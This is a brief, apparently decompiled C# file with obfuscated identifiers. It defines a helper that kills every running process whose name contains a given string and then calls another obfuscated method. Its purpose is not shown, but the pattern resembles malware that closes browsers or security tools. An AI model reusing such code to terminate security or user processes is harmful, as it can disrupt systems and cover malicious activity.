using System;
using System.Diagnostics;

namespace igelRrgoft;

public sealed class GCbIUwguivS
{
	public static bool zuREIcDXNsa(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void QgpJaOuscjyy(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (zuREIcDXNsa(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					DbQGfNcxACeJl.jdmoOyvaEbtumBA();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
